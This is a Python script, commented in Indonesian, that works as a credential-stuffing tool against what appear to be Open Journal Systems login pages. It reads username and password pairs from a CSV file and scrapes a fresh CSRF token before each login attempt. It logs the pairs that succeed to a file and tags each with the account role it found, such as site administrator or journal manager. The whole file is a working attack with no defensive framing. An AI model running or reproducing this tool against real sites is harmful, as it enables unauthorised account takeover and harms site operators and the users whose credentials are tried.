import requests
import csv
import re

# warna terminal
GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"

# input dari user
login_page = input(">> masukan link login  : ").strip()
login_post = input(">> masukan link post   : ").strip()

session = requests.Session()

def get_csrf():
    try:
        r = session.get(login_page)
        match = re.search(r'name="csrfToken" value="(.*?)"', r.text)
        if match:
            return match.group(1)
    except Exception as e:
        print(RED + f"[!] Error ambil CSRF: {e}" + RESET)
    return None

def detect_role(response_text):
    text = response_text.lower()

    roles = []

    if "site administrator" in text:
        roles.append("SITE_ADMIN")
    if "journal manager" in text:
        roles.append("MANAGER")
    if "section editor" in text:
        roles.append("SECTION_EDITOR")
    if "assistant" in text:
        roles.append("ASSISTANT")
    if "author" in text:
        roles.append("AUTHOR")
    if "reviewer" in text:
        roles.append("REVIEWER")
    if "reader" in text:
        roles.append("READER")

    if not roles:
        return "UNKNOWN"

    return ",".join(roles)

# file output
success_file = open("result_success.txt", "a")

with open("list.csv", newline='') as file:
    reader = csv.DictReader(file)

    for row in reader:
        username = row['username']
        password = row['password']

        csrf = get_csrf()

        if not csrf:
            print(RED + "[!] Gagal ambil CSRF token" + RESET)
            break

        data = {
            "username": username,
            "password": password,
            "csrfToken": csrf
        }

        headers = {
            "User-Agent": "Mozilla/5.0",
            "Referer": login_page
        }

        try:
            r = session.post(login_post, data=data, headers=headers, timeout=10)

            if "login" not in r.url.lower():
                role = detect_role(r.text)

                result = f"[✔] SUCCESS: {username}:{password} | ROLE: {role}"
                print(GREEN + result + RESET)

                success_file.write(f"{username}:{password} | {role}\n")
            else:
                print(RED + f"[✘] FAILED : {username}:{password}" + RESET)

        except Exception as e:
            print(RED + f"[!] ERROR: {e}" + RESET)

success_file.close()
